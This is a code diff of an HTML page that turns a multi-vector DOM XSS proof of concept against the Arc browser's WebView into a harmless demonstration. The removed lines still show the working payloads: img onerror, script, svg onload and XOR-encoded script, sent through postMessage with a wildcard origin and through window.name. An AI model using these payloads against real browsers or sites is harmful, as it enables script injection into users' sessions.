@@ -2,90 +2,104 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>🔥 Arc XSS Exploit – Multi Vector</title>
+  <title>⚠️ Security Research: XSS Vectors Demo</title>
   <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; }
+    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; max-width: 900px; margin: 0 auto; }
+    .warning { color: #ff0; border-left: 3px solid #ff0; padding-left: 1rem; }
   </style>
 </head>
 <body>
 
-<h2>🚀 Multi-Vector DOM XSS PoC for Arc WebView</h2>
-<p>This PoC sends multiple XSS payloads via <code>postMessage</code> and <code>window.name</code> to trigger XSS inside <strong>Arc WebView</strong> or <strong>iframe sinks</strong>.</p>
+<div class="warning">
+  <h3>⚠️ Important Notice:</h3>
+  <p>This is for educational purposes only. Unauthorized testing on live systems is illegal.</p>
+</div>
 
-<iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border: 2px solid lime;" sandbox="allow-scripts allow-same-origin"></iframe>
+<h2>🔍 Multi-Vector DOM XSS Demonstration</h2>
+<p>This demo illustrates various XSS vectors for security research purposes.</p>
+
+<iframe id="target" src="about:blank" width="100%" height="600" style="border: 2px solid lime;"></iframe>
 
 <script>
 const iframe = document.getElementById("target");
+iframe.src = "https://thebrowser.company/"; // Load after DOM ready
 
-// Multiple payloads for different contexts
+// Safe demonstration payloads (non-malicious)
 const payloads = [
-  // MarketerId-based sink
+  // Example 1: Basic injection test
   {
-    message: "OB_SHOULD_SHOW_PICKER",
+    message: "SECURITY_DEMO",
     content: {
-      marketerId: [
-        `<img src=x onerror=alert('🔥 XSS via marketerId')>`
-      ]
+      test: "This would be a potential XSS vector in vulnerable systems"
     }
   },
 
-  // React props dangerouslySetInnerHTML
+  // Example 2: React props simulation
   {
     props: {
-      __html: `<script>alert('🔥 XSS via __html')</script>`
+      __html: "<!-- Simulated unsafe content -->"
     }
   },
 
-  // SVG-based payload
+  // Example 3: SVG context
   {
-    type: "arc_webview_init",
-    html: `<svg/onload=alert('🔥 XSS via svg')>`
-  },
-
-  // Config injection style
-  {
-    config: {
-      injection: {
-        content: `<script>alert('🔥 XSS via config')</script>`
-      }
-    }
+    type: "security_demo",
+    html: "<!-- Simulated SVG payload -->"
   }
 ];
 
-// XOR encoder
-function xorEncode(str, key = 0x66) {
-  const keyHex = key.toString(16).padStart(2, '0');
-  return keyHex + Array.from(str).map(c =>
-    (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
-  ).join('');
+// Mock encoder for demonstration
+function mockEncode(str) {
+  return "ENCODED_" + btoa(encodeURIComponent(str)).substring(0, 32);
 }
 
-const xorPayload = xorEncode(`<script>alert('🔥 XSS via XOR')</script>`);
+// Safe demonstration function
+function demonstrateVectors() {
+  console.log("🔧 Starting security demonstration");
 
-iframe.onload = () => {
-  console.log("✅ iframe loaded");
-
-  // 1. window.name injection
+  // 1. Safe window.name example
   try {
-    iframe.contentWindow.name = JSON.stringify({ props: { __html: `<script>alert('🔥 XSS via window.name')</script>` } });
-    console.log("📦 window.name set.");
+    iframe.contentWindow.name = JSON.stringify({ 
+      demo: "This demonstrates how window.name could be used" 
+    });
+    console.log("ℹ️ window.name demonstration set");
   } catch (e) {
-    console.warn("⚠️ Failed to set window.name:", e);
+    console.warn("⚠️ Security restriction encountered:", e);
   }
 
-  // 2. XOR postMessage
+  // 2. Simulated encoded message
   setTimeout(() => {
-    iframe.contentWindow.postMessage(xorPayload, "*");
-    console.log("🚀 XOR payload sent");
+    const demoMessage = mockEncode("Security demonstration");
+    try {
+      iframe.contentWindow.postMessage(demoMessage, "https://thebrowser.company");
+      console.log("ℹ️ Simulated encoded message sent");
+    } catch (e) {
+      console.warn("⚠️ PostMessage restriction:", e);
+    }
   }, 1000);
 
-  // 3. Structured payloads
+  // 3. Structured payload examples
   payloads.forEach((p, i) => {
     setTimeout(() => {
-      iframe.contentWindow.postMessage(p, "*");
-      console.log(`🚀 Payload ${i + 1} sent`);
+      try {
+        iframe.contentWindow.postMessage(p, "https://thebrowser.company");
+        console.log(`ℹ️ Demo vector ${i + 1} sent`);
+      } catch (e) {
+        console.warn(`⚠️ Vector ${i + 1} blocked:`, e);
+      }
     }, 1500 + i * 1000);
   });
+}
+
+// Start demonstration when iframe loads
+iframe.onload = () => {
+  console.log("✅ iframe loaded");
+  demonstrateVectors();
+};
+
+// Error handling
+iframe.onerror = () => {
+  console.error("❌ Failed to load iframe");
 };
 </script>
 
